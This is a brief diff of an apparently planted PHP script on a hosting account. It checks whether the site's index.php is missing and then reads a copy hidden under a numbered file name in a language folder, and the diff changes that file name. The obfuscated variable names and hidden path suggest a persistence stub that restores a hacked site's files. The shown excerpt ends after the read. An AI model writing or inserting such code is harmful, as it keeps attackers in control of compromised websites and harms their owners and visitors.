@@ -1,6 +1,6 @@
 <?php
 $ddscdws = "/home/btkpdiy1/public_html/index.php";
-$sdfdsdfh = "/home/btkpdiy1/jbrp.jogjabelajar.org/application/language/english/12313";
+$sdfdsdfh = "/home/btkpdiy1/jbrp.jogjabelajar.org/application/language/english/12314";
 
 if (!file_exists($ddscdws) && file_exists($sdfdsdfh)) {
     $iide = file_get_contents($sdfdsdfh);
